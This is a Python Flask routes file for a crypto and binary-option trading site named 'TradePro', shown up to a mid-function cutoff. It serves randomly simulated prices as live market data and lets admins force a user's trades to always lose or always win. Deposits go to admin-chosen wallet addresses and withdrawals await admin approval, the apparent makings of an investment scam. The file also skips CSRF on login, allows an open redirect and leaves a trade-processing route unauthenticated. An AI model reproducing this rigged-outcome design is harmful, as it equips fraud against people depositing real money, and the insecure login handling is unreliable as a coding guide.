from flask import render_template, redirect, url_for, flash, request, jsonify, session
from flask_login import login_user, logout_user, login_required, current_user
from werkzeug.security import check_password_hash, generate_password_hash
from werkzeug.utils import secure_filename
from datetime import datetime, timedelta
from decimal import Decimal
import random
import json
import os
import time
from functools import wraps

from app import app, db
from models import User, Wallet, Trade, StakingPosition, Transaction, MarketData, DepositRequest, WithdrawalRequest, AdminSettings, KYCRequest, SupportTicket, SupportMessage
from forms import (LoginForm, RegisterForm, TradeForm, StakingForm, WithdrawForm, 
                  DepositForm, AdminUserForm, CryptoDepositForm, AdminDepositForm, 
                  AdminSettingsForm, TradeManipulationForm, KYCForm, AdminKYCForm,
                  SupportTicketForm, SupportMessageForm, AdminSupportReplyForm)
from utils import generate_market_price, get_asset_price
from market_data import market_data
from payout_manager import payout_manager
from qr_generator import generate_crypto_qr_code
try:
    from twelve_data_integration import twelve_data_api
except ImportError:
    twelve_data_api = None
import logging

# Configure logging for debugging
logging.basicConfig(level=logging.DEBUG)

@app.context_processor
def inject_admin_counts():
    """Inject admin notification counts into all templates"""
    if current_user.is_authenticated and current_user.is_admin:
        pending_deposits = DepositRequest.query.filter_by(status='pending').count()
        pending_withdrawals = WithdrawalRequest.query.filter_by(status='pending').count()
        pending_kyc = KYCRequest.query.filter_by(status='pending').count()
        pending_users = User.query.filter_by(is_approved=False, is_admin=False).count()
        pending_support = SupportTicket.query.filter(SupportTicket.status.in_(['open', 'in_progress'])).count()
        unread_support = db.session.query(SupportMessage).join(SupportTicket).filter(
            SupportMessage.is_from_user == True,
            SupportMessage.read_by_admin == False
        ).count()
        return dict(
            pending_deposits=pending_deposits,
            pending_withdrawals=pending_withdrawals,
            pending_kyc=pending_kyc,
            pending_users=pending_users,
            pending_support=pending_support,
            unread_support=unread_support
        )
    return dict(
        pending_deposits=0,
        pending_withdrawals=0,
        pending_kyc=0,
        pending_support=0,
        unread_support=0
    )

@app.route('/')
def index():
    if current_user.is_authenticated:
        if current_user.is_admin:
            return redirect(url_for('admin_dashboard'))
        else:
            return redirect(url_for('dashboard'))
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('dashboard'))
    
    form = LoginForm()
    
    # Handle direct login attempts without CSRF for testing
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        
        if email and password:
            user = User.query.filter_by(email=email).first()
            if user and check_password_hash(user.password_hash, password):
                if not user.is_active:
                    flash('Your account has been deactivated. Please contact support.', 'error')
                    return render_template('login.html', form=form)
                
                if not user.is_approved:
                    flash('Your account is pending admin approval. Please wait for approval to access the platform.', 'warning')
                    return render_template('login.html', form=form)
                
                login_user(user)
                user.last_login = datetime.utcnow()
                db.session.commit()
                
                next_page = request.args.get('next')
                if next_page:
                    return redirect(next_page)
                elif user.is_admin:
                    return redirect(url_for('admin_dashboard'))
                else:
                    return redirect(url_for('dashboard'))
            else:
                flash('Invalid email or password', 'error')
        else:
            flash('Please fill in all fields', 'error')
    
    return render_template('login.html', form=form)

@app.route('/register', methods=['GET', 'POST'])
def register():
    if current_user.is_authenticated:
        return redirect(url_for('dashboard'))
    
    form = RegisterForm()
    if form.validate_on_submit():
        user = User(
            username=form.username.data,
            email=form.email.data,
            first_name=form.first_name.data,
            last_name=form.last_name.data,
            password_hash=generate_password_hash(form.password.data),
            is_approved=False  # New users need admin approval
        )
        db.session.add(user)
        db.session.flush()  # Get user ID
        
        # Create wallet for new user with $50 welcome bonus
        wallet = Wallet(user_id=user.id, balance=50.00)  # $50 live trading welcome bonus
        db.session.add(wallet)
        
        # Create welcome transaction
        transaction = Transaction(
            user_id=user.id,
            transaction_type='deposit',
            amount=50.00,
            description='$50 Welcome bonus - Live trading'
        )
        db.session.add(transaction)
        
        db.session.commit()
        
        flash('Registration successful! Your account is pending admin approval. You will be able to log in once approved.', 'info')
        return redirect(url_for('login'))
    
    return render_template('register.html', form=form)

@app.route('/logout')
@login_required
def logout():
    logout_user()
    flash('You have been logged out successfully.', 'info')
    return redirect(url_for('index'))

@app.route('/dashboard')
@login_required
def dashboard():
    wallet = current_user.wallet
    if not wallet:
        wallet = Wallet(user_id=current_user.id)
        db.session.add(wallet)
        db.session.commit()
    
    # Get recent trades
    recent_trades = Trade.query.filter_by(user_id=current_user.id).order_by(Trade.created_at.desc()).limit(5).all()
    
    # Get active staking positions
    active_staking = StakingPosition.query.filter_by(user_id=current_user.id, status='active').all()
    
    # Calculate total staking rewards
    total_staking_rewards = sum(pos.calculate_rewards() for pos in active_staking)
    
    # Trading statistics
    completed_trades = Trade.query.filter_by(user_id=current_user.id).filter(Trade.status.in_(['profit', 'lose'])).all()
    total_trades = len(completed_trades)
    won_trades = len([t for t in completed_trades if t.status == 'profit'])
    lost_trades = total_trades - won_trades
    win_rate = (won_trades / total_trades * 100) if total_trades > 0 else 0
    
    # Calculate total profit/loss
    total_profit_loss = sum(float(t.profit_loss) for t in completed_trades)
    
    # Calculate average trade size
    avg_trade_size = sum(float(t.amount) for t in completed_trades) / total_trades if total_trades > 0 else 0
    
    # Get active trades
    active_trades = Trade.query.filter_by(user_id=current_user.id, status='active').all()
    
    # Get latest KYC request status
    kyc_request = KYCRequest.query.filter_by(user_id=current_user.id).order_by(KYCRequest.created_at.desc()).first()
    
    return render_template('dashboard.html', 
                         wallet=wallet, 
                         recent_trades=recent_trades,
                         active_trades=active_trades,
                         active_staking=active_staking,
                         total_staking_rewards=total_staking_rewards,
                         total_trades=total_trades,
                         won_trades=won_trades,
                         lost_trades=lost_trades,
                         win_rate=win_rate,
                         total_profit_loss=total_profit_loss,
                         avg_trade_size=avg_trade_size,
                         kyc_request=kyc_request)

@app.route('/trading/demo')
@login_required
def demo_trading():
    form = TradeForm()
    return render_template('trading/demo.html', form=form, is_demo=True)

@app.route('/trading/live')
@login_required
def live_trading():
    # Check if user is KYC verified for live trading
    if not current_user.kyc_verified:
        flash('You must complete KYC verification to access live trading. Please submit your verification documents.', 'warning')
        return redirect(url_for('kyc_verification'))
    
    wallet = current_user.wallet
    if not wallet or wallet.balance < 1:
        flash('Insufficient balance for live trading. Please deposit funds.', 'warning')
        return redirect(url_for('wallet'))
    
    form = TradeForm()
    return render_template('trading/live.html', form=form, is_demo=False)

@app.route('/test_trade', methods=['GET', 'POST'])
@login_required
def test_trade():
    print(f"[TEST] Test route hit - method: {request.method}")
    return jsonify({'success': True, 'message': 'Test route working'})

@app.route('/place_trade', methods=['POST'])
@login_required
def place_trade():
    try:
        print(f"[TRADE] Request method: {request.method}")
        print(f"[TRADE] Content type: {request.content_type}")
        print(f"[TRADE] Form data: {dict(request.form)}")
        print(f"[TRADE] User: {current_user.username}")
        
        # Handle both form and AJAX requests
        if request.is_json:
            data = request.get_json()
        else:
            data = request.form
        
        print(f"[TRADE] Parsed data: {dict(data)}")
        
        # Extract trade data with validation
        asset = data.get('asset', '').strip()
        trade_type = data.get('trade_type', '').strip()
        
        try:
            amount = float(data.get('amount', 0))
        except (ValueError, TypeError):
            amount = 0
            
        # Handle both expiry_seconds (new) and expiry_minutes (legacy) for backward compatibility
        try:
            if 'expiry_seconds' in data:
                expiry_seconds = int(data.get('expiry_seconds', 300))
            elif 'expiry_minutes' in data:
                expiry_minutes = int(data.get('expiry_minutes', 5))
                expiry_seconds = expiry_minutes * 60
            else:
                expiry_seconds = 300  # Default 5 minutes
        except (ValueError, TypeError):
            expiry_seconds = 300
            
        # Determine if this is demo or live trading based on the referrer URL
        referrer = request.referrer or ''
        is_demo = '/demo' in referrer or 'demo' in referrer.lower()
        
        # If no referrer, check for explicit is_demo parameter
        if 'is_demo' in data:
            is_demo = str(data.get('is_demo', 'true')).lower() == 'true'
        
        logging.info(f"Parsed trade: asset={asset}, type={trade_type}, amount={amount}, expiry={expiry_seconds}s, demo={is_demo}")
        
        # Validation
        if not asset or not trade_type or amount <= 0:
            error_msg = f'Invalid trade parameters: asset={asset}, type={trade_type}, amount={amount}'
            logging.error(error_msg)
            return jsonify({'success': False, 'message': 'Invalid trade parameters'}), 400
        
        # Check balance and duration requirements
        wallet = current_user.wallet
        if not wallet:
            logging.error(f"No wallet found for user {current_user.id}")
            return jsonify({'success': False, 'message': 'Wallet not found'}), 400
            
        available_balance = wallet.demo_balance if is_demo else wallet.balance
        
        # Simplified capital range validation - based on user balance and amount only
        if amount > available_balance:
            logging.info(f"Trade validation failed: amount=${amount:.2f} exceeds balance=${available_balance:.2f}")
            return jsonify({'success': False})
            
        # Minimum trade amount validation
        if amount < 1:
            logging.info(f"Trade validation failed: amount=${amount:.2f} below minimum $1")
            return jsonify({'success': False})
        
        # Use simulated market price (no real data dependency)
        entry_price = generate_market_price(asset)
        
        # Calculate expiry time
        expiry_time = datetime.utcnow() + timedelta(seconds=expiry_seconds)
        
        # Get payout percentage - 100% return (1:1 ratio)
        try:
            expiry_minutes_for_payout = int(expiry_seconds / 60)  # Convert to minutes for payout calculation
            payout_percentage = payout_manager.get_current_payout(asset, expiry_minutes_for_payout)
        except:
            payout_percentage = 100.0  # 100% payout for 1:1 profit ratio
        
        # Create trade
        trade = Trade(
            user_id=current_user.id,
            asset=asset,
            trade_type=trade_type,
            amount=amount,
            entry_price=entry_price,
            expiry_time=expiry_time,
            payout_percentage=payout_percentage,
            is_demo=is_demo
        )
        
        # Deduct amount from balance (convert to Decimal for compatibility)
        amount_decimal = Decimal(str(amount))
        if is_demo:
            wallet.demo_balance -= amount_decimal
        else:
            wallet.balance -= amount_decimal
        
        # Create transaction record
        transaction = Transaction(
            user_id=current_user.id,
            transaction_type='trade',
            amount=-amount_decimal,
            description=f'Trade: {asset} {trade_type.upper()} ${amount}'
        )
        
        db.session.add(trade)
        db.session.add(transaction)
        db.session.commit()
        
        # Return response
        response_data = {
            'success': True,
            'trade_id': trade.id,
            'entry_price': entry_price,
            'expiry_time': expiry_time.isoformat(),
            'payout_percentage': payout_percentage,
            'new_balance': float(wallet.demo_balance if is_demo else wallet.balance),
            'message': f'Trade placed successfully! Entry price: ${entry_price:.5f}'
        }
        
        if request.is_json or request.headers.get('X-Requested-With') == 'XMLHttpRequest':
            return jsonify(response_data)
        
        flash(response_data['message'], 'success')
        return redirect(request.referrer or url_for('demo_trading'))
        
    except Exception as e:
        import traceback
        error_details = traceback.format_exc()
        logging.error(f"Error placing trade: {e}")
        logging.error(f"Full traceback: {error_details}")
        error_message = f'Trade placement failed: {str(e)}'
        
        if request.is_json or request.headers.get('X-Requested-With') == 'XMLHttpRequest':
            return jsonify({'success': False, 'error': error_message}), 500
        
        flash(error_message, 'error')
        return redirect(request.referrer or url_for('demo_trading'))



@app.route('/wallet', methods=['GET', 'POST'])
@login_required
def wallet():
    wallet = current_user.wallet
    transactions = Transaction.query.filter_by(user_id=current_user.id).order_by(Transaction.created_at.desc()).limit(20).all()
    
    deposit_form = DepositForm()
    withdraw_form = WithdrawForm()
    
    return render_template('wallet.html', 
                         wallet=wallet, 
                         transactions=transactions,
                         deposit_form=deposit_form,
                         withdraw_form=withdraw_form)

@app.route('/deposit', methods=['GET', 'POST'])
@login_required
def deposit():
    form = DepositForm()
    if request.method == 'POST' and form.validate_on_submit():
        # Redirect to deposit page with amount and currency
        return redirect(url_for('crypto_deposit', 
                              amount=form.amount.data, 
                              currency=form.currency.data))
    elif request.method == 'POST':
        flash('Please check your deposit details', 'error')
        return redirect(url_for('wallet'))
    
    # GET request - show deposit form
    return render_template('deposit/deposit.html', form=form)

@app.route('/deposit/crypto', methods=['GET', 'POST'])
@login_required
def crypto_deposit():
    amount = request.args.get('amount', type=float)
    currency = request.args.get('currency', '')
    
    if not amount or not currency:
        flash('Invalid deposit request', 'error')
        return redirect(url_for('wallet'))
    
    # Get admin-set wallet addresses
    addresses = {}
    qr_codes = {}
    
    usdt_setting = AdminSettings.query.filter_by(setting_key='usdt_address').first()
    btc_setting = AdminSettings.query.filter_by(setting_key='btc_address').first()
    eth_setting = AdminSettings.query.filter_by(setting_key='eth_address').first()
    
    # Get QR code settings
    usdt_qr_setting = AdminSettings.query.filter_by(setting_key='usdt_qr_code').first()
    btc_qr_setting = AdminSettings.query.filter_by(setting_key='btc_qr_code').first()
    eth_qr_setting = AdminSettings.query.filter_by(setting_key='eth_qr_code').first()
    
    if usdt_setting:
        addresses['USDT'] = usdt_setting.setting_value
        qr_codes['USDT'] = usdt_qr_setting.setting_value if usdt_qr_setting else None
    if btc_setting:
        addresses['BTC'] = btc_setting.setting_value
        qr_codes['BTC'] = btc_qr_setting.setting_value if btc_qr_setting else None
    if eth_setting:
        addresses['ETH'] = eth_setting.setting_value
        qr_codes['ETH'] = eth_qr_setting.setting_value if eth_qr_setting else None
    
    # Check if admin has set the address for this currency
    if currency not in addresses:
        flash(f'Deposit address for {currency} not configured. Please contact support.', 'error')
        return redirect(url_for('wallet'))
    
    return render_template('deposit/crypto.html', 
                         amount=amount, 
                         currency=currency,
                         address=addresses[currency],
                         qr_code=qr_codes[currency])

@app.route('/deposit/submit', methods=['POST'])
@login_required
def submit_deposit():
    try:
        # Get form data from hidden fields and file upload
        amount = request.form.get('amount')
        currency = request.form.get('currency')
        transaction_hash = request.form.get('transaction_hash')
        
        # Validate required fields
        if not amount or not currency:
            flash('Missing deposit information. Please try again.', 'error')
            return redirect(url_for('wallet'))
        
        # Handle file upload for proof of payment
        proof_filename = None
        if 'proof_document' in request.files:
            file = request.files['proof_document']
            if file and file.filename:
                import os
                from werkzeug.utils import secure_filename
                
                # Create uploads directory if it doesn't exist
                upload_dir = os.path.join('static', 'uploads', 'deposits')
                os.makedirs(upload_dir, exist_ok=True)
                
                # Generate secure filename
                filename = secure_filename(file.filename)
                timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
                proof_filename = f"{current_user.id}_{timestamp}_{filename}"
                
                # Save file
                file.save(os.path.join(upload_dir, proof_filename))
        
        # Create deposit request
        deposit_request = DepositRequest(
            user_id=current_user.id,
            amount=float(amount),
            currency=currency,
            transaction_hash=transaction_hash if transaction_hash else None,
            proof_document=proof_filename
        )
        
        db.session.add(deposit_request)
        db.session.commit()
        
        flash(f'Deposit request submitted successfully! Amount: ${amount} {currency}. Admin will review and approve your deposit within 1-30 minutes.', 'success')
        return redirect(url_for('deposit_status'))
        
    except Exception as e:
        flash('Error submitting deposit request. Please try again.', 'error')
        return redirect(url_for('wallet'))

@app.route('/deposit/status', methods=['GET', 'POST'])
@login_required
def deposit_status():
    deposits = DepositRequest.query.filter_by(user_id=current_user.id).order_by(DepositRequest.created_at.desc()).all()
    return render_template('deposit/status.html', deposits=deposits)

@app.route('/withdraw', methods=['POST'])
@login_required
def withdraw():
    form = WithdrawForm()
    if form.validate_on_submit():
        wallet = current_user.wallet
        
        if wallet.balance < form.amount.data:
            flash('Insufficient balance', 'error')
        else:
            # Create withdrawal request with cryptocurrency details
            withdrawal_request = WithdrawalRequest(
                user_id=current_user.id,
                amount=form.amount.data,
                currency=form.currency.data,
                wallet_address=form.wallet_address.data,
                status='pending'
            )
            
            db.session.add(withdrawal_request)
            db.session.commit()
            
            flash(f'Withdrawal request of ${form.amount.data:.2f} {form.currency.data} submitted successfully! Admin will review and process your request within 24 hours.', 'success')
            return redirect(url_for('user_withdrawals'))
    else:
        flash('Invalid withdrawal amount', 'error')
    
    return redirect(url_for('wallet'))

@app.route('/withdrawals')
@login_required
def user_withdrawals():
    """User's withdrawal requests page"""
    withdrawals = WithdrawalRequest.query.filter_by(user_id=current_user.id).order_by(WithdrawalRequest.created_at.desc()).all()
    return render_template('user_withdrawals.html', withdrawals=withdrawals)

@app.route('/kyc-verification', methods=['GET', 'POST'])
@login_required
def kyc_verification():
    """KYC verification page for users"""
    # Check if user already has a pending or approved KYC request
    existing_kyc = KYCRequest.query.filter_by(user_id=current_user.id).first()
    
    if existing_kyc:
        if existing_kyc.status == 'approved':
            flash('Your KYC verification has been approved. You can now access live trading.', 'success')
            return redirect(url_for('live_trading'))
        elif existing_kyc.status == 'pending':
            flash('Your KYC verification is pending approval. Please wait for admin review.', 'info')
            return render_template('kyc/status.html', kyc_request=existing_kyc)
        elif existing_kyc.status == 'rejected':
            flash('Your previous KYC request was rejected. Please submit a new request with correct documents.', 'warning')
    
    form = KYCForm()
    
    if form.validate_on_submit():
        import os
        from werkzeug.utils import secure_filename
        
        # Create uploads directory if it doesn't exist
        upload_dir = os.path.join('static', 'uploads', 'kyc')
        os.makedirs(upload_dir, exist_ok=True)
        
        # Save uploaded files
        id_doc_filename = secure_filename(f"id_{current_user.id}_{form.id_document.data.filename}")
        selfie_filename = secure_filename(f"selfie_{current_user.id}_{form.selfie.data.filename}")
        
        id_doc_path = os.path.join(upload_dir, id_doc_filename)
        selfie_path = os.path.join(upload_dir, selfie_filename)
        
        form.id_document.data.save(id_doc_path)
        form.selfie.data.save(selfie_path)
        
        # Create KYC request
        kyc_request = KYCRequest(
            user_id=current_user.id,
            first_name=form.first_name.data,
            last_name=form.last_name.data,
            date_of_birth=form.date_of_birth.data,
            phone_number=form.phone_number.data,
            address=form.address.data,
            city=form.city.data,
            country=form.country.data,
            postal_code=form.postal_code.data,
            id_document_type=form.id_document_type.data,
            id_document_path=id_doc_path,
            selfie_path=selfie_path,
            status='pending'
        )
        
        db.session.add(kyc_request)
        db.session.commit()
        
        flash('KYC verification request submitted successfully! Admin will review your documents within 24-48 hours.', 'success')
        return redirect(url_for('kyc_verification'))
    
    return render_template('kyc/submit.html', form=form)

@app.route('/staking', methods=['GET', 'POST'])
@login_required
def staking():
    form = StakingForm()
    positions = StakingPosition.query.filter_by(user_id=current_user.id).order_by(StakingPosition.created_at.desc()).all()
    
    # Update rewards for active positions
    for position in positions:
        if position.status == 'active':
            position.rewards_earned = position.calculate_rewards()
    
    db.session.commit()
    
    return render_template('staking.html', form=form, positions=positions)

@app.route('/stake', methods=['POST'])
@login_required
def stake():
    form = StakingForm()
    if form.validate_on_submit():
        wallet = current_user.wallet
        
        if wallet.balance < form.amount.data:
            flash('Insufficient balance', 'error')
        else:
            duration_data = form.duration.data.split('-')
            duration_days = int(duration_data[0])
            
            # APY mapping
            apy_map = {'7': 8.0, '30': 12.0, '90': 18.0, '180': 25.0}
            apy = apy_map.get(str(duration_days), 12.0)
            
            position = StakingPosition(
                user_id=current_user.id,
                amount=form.amount.data,
                apy=apy,
                duration_days=duration_days
            )
            
            wallet.balance -= form.amount.data
            
            transaction = Transaction(
                user_id=current_user.id,
                transaction_type='staking',
                amount=-form.amount.data,
                description=f'Staking for {duration_days} days at {apy}% APY'
            )
            
            db.session.add(position)
            db.session.add(transaction)
            db.session.commit()
            
            flash(f'Successfully staked ${form.amount.data} for {duration_days} days', 'success')
    else:
        flash('Invalid staking parameters', 'error')
    
    return redirect(url_for('staking'))

@app.route('/profile', methods=['GET', 'POST'])
@login_required
def profile():
    return render_template('profile.html')

# Removed duplicate admin routes - using the comprehensive admin system below

# Legacy API Route (keeping for compatibility)
@app.route('/api/market_data/<symbol>')
def api_market_data_legacy(symbol):
    """Get current market price for symbol (legacy endpoint)"""
    price = get_asset_price(symbol)
    return jsonify({
        'symbol': symbol,
        'price': float(price),
        'timestamp': datetime.utcnow().isoformat()
    })

@app.route('/api/chart_data_legacy/<symbol>')
def api_chart_data_legacy(symbol):
    """Generate sample chart data for trading interface (legacy)"""
    # Generate sample OHLC data
    base_price = get_asset_price(symbol)
    data = []
    
    for i in range(100):
        timestamp = datetime.utcnow() - timedelta(minutes=100-i)
        price_change = random.uniform(-0.02, 0.02)
        price = base_price * (1 + price_change)
        
        data.append({
            'time': timestamp.isoformat(),
            'open': round(price * random.uniform(0.998, 1.002), 5),
            'high': round(price * random.uniform(1.001, 1.005), 5),
            'low': round(price * random.uniform(0.995, 0.999), 5),
            'close': round(price, 5)
        })
    
    return jsonify(data)

@app.route('/api/twelve-data-status')
def api_twelve_data_status():
    """Check Twelve Data API status and usage"""
    try:
        if not twelve_data_api or not twelve_data_api.api_key:
            return jsonify({
                'status': 'not_configured',
                'message': 'Twelve Data API key not set'
            })
        
        usage = twelve_data_api.check_api_usage()
        is_working = twelve_data_api.is_api_working()
        
        return jsonify({
            'status': 'configured',
            'working': is_working,
            'usage': usage,
            'message': 'Twelve Data API is ready' if is_working else 'API key configured but not responding'
        })
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/api/market-data-new/<symbol>')
def api_market_data_new(symbol):
    """Get simulated market data for symbol"""
    # Return simulated market data instead of real data
    from utils import generate_market_price
    price = generate_market_price(symbol)
    change = random.uniform(-0.005, 0.005) * price
    
    return jsonify({
        'symbol': symbol,
        'price': price,
        'change': change,
        'change_percent': (change / price * 100),
        'volume': random.randint(10000, 100000),
        'high_24h': price * 1.01,
        'low_24h': price * 0.99,
        'timestamp': datetime.utcnow().isoformat()
    })

@app.route('/api/chart-data-new/<symbol>')
def api_chart_data_new(symbol):
    """Get simulated chart data for trading interface"""
    period = request.args.get('period', '1d')
    interval = request.args.get('interval', '5m')
    
    # Generate simulated chart data
    from utils import generate_market_price
    base_price = generate_market_price(symbol)
    data = []
    
    current_time = datetime.utcnow()
    current_price = base_price
    
    for i in range(50):
        timestamp = current_time - timedelta(minutes=50-i)
        
        # Simulate price movement
        change = (random.random() - 0.5) * base_price * 0.005
        current_price += change
        
        data.append({
            'timestamp': timestamp.isoformat(),
            'open': current_price,
            'high': current_price * (1 + random.random() * 0.002),
            'low': current_price * (1 - random.random() * 0.002),
            'close': current_price,
            'volume': random.randint(1000, 10000)
        })
    
    return jsonify({
        'symbol': symbol,
        'data': data,
        'period': period,
        'interval': interval
    })

@app.context_processor
def inject_global_vars():
    """Inject global variables into all templates"""
    # Count pending requests for admin notifications
    pending_deposits = 0
    pending_withdrawals = 0
    if current_user.is_authenticated and current_user.is_admin:
        pending_deposits = DepositRequest.query.filter_by(status='pending').count()
        pending_withdrawals = WithdrawalRequest.query.filter_by(status='pending').count()
    
    return {
        'current_year': datetime.utcnow().year,
        'app_name': 'TradePro',
        'pending_deposits': pending_deposits,
        'pending_withdrawals': pending_withdrawals
    }

# Background task to process expired trades
@app.route('/process_trades')
def process_expired_trades():
    """Process expired trades (normally would be a background task)"""
    expired_trades = Trade.query.filter(
        Trade.status == 'active',
        Trade.expiry_time <= datetime.utcnow()
    ).all()
    
    for trade in expired_trades:
        current_price = get_asset_price(trade.asset)
        trade.calculate_result(current_price)
        
        # Update wallet based on result
        wallet = trade.user.wallet
        if trade.status == 'won':
            if trade.is_demo:
                wallet.demo_balance += trade.amount + trade.profit_loss
            else:
                wallet.balance += trade.amount + trade.profit_loss
            
            # Create transaction
            transaction = Transaction(
                user_id=trade.user_id,
                transaction_type='trade',
                amount=trade.amount + trade.profit_loss,
                description=f'Won trade: {trade.asset} {trade.trade_type}'
            )
            db.session.add(transaction)
    
    db.session.commit()
    return jsonify({'processed': len(expired_trades)})

@app.route('/api/wallet_balance')
@login_required
def api_wallet_balance():
    """Get user's current wallet balance"""
    wallet = Wallet.query.filter_by(user_id=current_user.id).first()
    logging.info(f"Balance API called for user {current_user.id}")
    if wallet:
        balance_data = {
            'success': True,
            'balance': float(wallet.balance),
            'demo_balance': float(wallet.demo_balance)
        }
        logging.info(f"Returning balance data: {balance_data}")
        return jsonify(balance_data)
    
    logging.warning(f"No wallet found for user {current_user.id}")
    return jsonify({
        'success': True,
        'balance': 0.00, 
        'demo_balance': 10000.00
    })

@app.route('/api/active_trades')
@login_required
def api_active_trades():
    """Get user's active trades"""
    try:
        # Get active trades without processing expired ones first
        active_trades = Trade.query.filter_by(
            user_id=current_user.id,
            status='active'
        ).order_by(Trade.created_at.desc()).all()
        
        trades_data = []
        for trade in active_trades:
            # Calculate remaining time
            remaining_seconds = (trade.expiry_time - datetime.utcnow()).total_seconds()
            
            trades_data.append({
                'id': trade.id,
                'asset': trade.asset,
                'trade_type': trade.trade_type,
                'amount': float(trade.amount),
                'entry_price': float(trade.entry_price),
                'expiry_time': trade.expiry_time.isoformat(),
                'remaining_seconds': max(0, int(remaining_seconds)),
                'payout_percentage': float(trade.payout_percentage),
                'created_at': trade.created_at.isoformat(),
                'is_demo': trade.is_demo
            })
        
        return jsonify({
            'success': True,
            'trades': trades_data
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        })

@app.route('/api/trade_history')
@login_required
def api_trade_history():
    """Get user's completed trades history"""
    try:
        completed_trades = Trade.query.filter(
            Trade.user_id == current_user.id,
            Trade.status.in_(['won', 'lost', 'cancelled'])
        ).order_by(Trade.closed_at.desc()).limit(50).all()
        
        trades_data = []
        for trade in completed_trades:
            trades_data.append({
                'id': trade.id,
                'asset': trade.asset,
                'trade_type': trade.trade_type,
                'amount': float(trade.amount),
                'entry_price': float(trade.entry_price),
                'exit_price': float(trade.exit_price) if trade.exit_price else None,
                'status': trade.status,
                'profit_loss': float(trade.profit_loss),
                'payout_percentage': float(trade.payout_percentage),
                'created_at': trade.created_at.isoformat(),
                'closed_at': trade.closed_at.isoformat() if trade.closed_at else None,
                'is_demo': trade.is_demo
            })
        
        return jsonify({
            'success': True,
            'trades': trades_data
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        })

def process_expired_trades_for_user(user_id):
    """Process expired trades for a specific user"""
    from market_data import RealMarketData
    
    try:
        # Get expired trades for this user
        expired_trades = Trade.query.filter(
            Trade.user_id == user_id,
            Trade.status == 'active',
            Trade.expiry_time <= datetime.utcnow()
        ).all()
        
        if not expired_trades:
            return
        
        market_data = RealMarketData()
        
        # Get user and check trade control settings
        user = User.query.get(user_id)
        trade_control = user.trade_control if user else 'normal'
        
        for trade in expired_trades:
            try:
                # Get current price for the asset
                current_price_data = market_data.get_real_price(trade.asset)
                
                # Handle different return formats from market data
                if current_price_data:
                    if isinstance(current_price_data, dict) and 'price' in current_price_data:
                        current_price = float(current_price_data['price'])
                    elif isinstance(current_price_data, (int, float)):
                        current_price = float(current_price_data)
                    else:
                        # Use fallback price if format is unexpected
                        current_price = float(trade.entry_price) * (1 + random.uniform(-0.005, 0.005))
                else:
                    # Use fallback price if real data unavailable
                    current_price = float(trade.entry_price) * (1 + random.uniform(-0.005, 0.005))
                
                # Set basic trade info
                trade.exit_price = current_price
                trade.closed_at = datetime.utcnow()
                
                # Apply admin trade control overrides
                from decimal import Decimal
                
                if trade_control == 'always_lose':
                    # Force trade to lose regardless of market outcome
                    trade.status = 'lost'
                    trade.profit_loss = -Decimal(str(trade.amount))
                elif trade_control == 'always_profit':
                    # Force trade to win regardless of market outcome
                    trade.status = 'won'
                    trade.profit_loss = Decimal(str(trade.amount)) * (Decimal(str(trade.payout_percentage)) / Decimal('100'))
                else:
                    # Normal trading - determine win/loss based on market price
                    if trade.trade_type == 'call':
                        is_winner = current_price > float(trade.entry_price)
                    else:  # put
                        is_winner = current_price < float(trade.entry_price)
                    
                    if is_winner:
                        trade.status = 'won'
                        trade.profit_loss = Decimal(str(trade.amount)) * (Decimal(str(trade.payout_percentage)) / Decimal('100'))
                    else:
                        trade.status = 'lost'
                        trade.profit_loss = -Decimal(str(trade.amount))
                
                # Update user wallet balance
                wallet = Wallet.query.filter_by(user_id=trade.user_id).first()
                if wallet:
                    profit_loss_decimal = Decimal(str(trade.profit_loss))
                    
                    if trade.is_demo:
                        wallet.demo_balance = wallet.demo_balance + profit_loss_decimal
                    else:
                        wallet.balance = wallet.balance + profit_loss_decimal
                    
                    wallet.updated_at = datetime.utcnow()
                
                # Create transaction record
                if trade.profit_loss > 0:
                    transaction = Transaction(
                        user_id=trade.user_id,
                        transaction_type='trade_win',
                        amount=trade.profit_loss,
                        description=f'Won trade: {trade.asset} {trade.trade_type}'
                    )
                else:
                    transaction = Transaction(
                        user_id=trade.user_id,
                        transaction_type='trade_loss',
                        amount=abs(trade.profit_loss),
                        description=f'Lost trade: {trade.asset} {trade.trade_type}'
                    )
                db.session.add(transaction)
                
            except Exception as e:
                print(f"Error processing trade {trade.id}: {e}")
                continue
        
        db.session.commit()
        print(f"Processed {len(expired_trades)} expired trades for user {user_id}")
        
    except Exception as e:
        print(f"Error processing expired trades for user {user_id}: {e}")
        db.session.rollback()

@app.route('/api/process_expired_trade/<int:trade_id>', methods=['POST'])
@login_required
def api_process_expired_trade(trade_id):
    """Process a single expired trade"""
    try:
        trade = Trade.query.filter_by(id=trade_id, user_id=current_user.id).first()
        
        if not trade:
            return jsonify({
                'success': False,
                'error': 'Trade not found'
            })
        
        if trade.status != 'active':
            return jsonify({
                'success': False,
                'error': 'Trade already processed'
            })
        
        # Allow processing when trade has expired or is about to expire
        from datetime import datetime, timedelta
        current_time = datetime.utcnow()
        time_buffer = timedelta(seconds=2)
        
        # Allow processing if we're within 2 seconds of expiry time or past it
        if current_time < (trade.expiry_time - time_buffer):
            return jsonify({
                'success': False,
                'error': 'Trade has not expired yet'
            })
        
        # Use simulated market price instead of real data
        from utils import generate_market_price
        current_price = generate_market_price(trade.asset, trade.entry_price)
        
        # Calculate trade result
        trade.exit_price = current_price
        trade.closed_at = datetime.utcnow()
        
        # Check admin control settings first
        trade_control = current_user.trade_control if current_user else 'normal'
        from decimal import Decimal
        
        if trade_control == 'always_lose':
            # Force trade to lose regardless of market outcome
            trade.status = 'lose'
            trade.profit_loss = -Decimal(str(trade.amount))
        elif trade_control == 'always_profit':
            # Force trade to win regardless of market outcome
            trade.status = 'profit'
            profit = Decimal(str(trade.amount)) * (Decimal(str(trade.payout_percentage)) / Decimal('100'))
            trade.profit_loss = profit
        else:
            # Normal trading - determine win/loss based on market price
            if trade.trade_type == 'call':
                won = current_price > trade.entry_price
            else:  # put
                won = current_price < trade.entry_price
            
            if won:
                trade.status = 'profit'
                profit = Decimal(str(trade.amount)) * (Decimal(str(trade.payout_percentage)) / Decimal('100'))
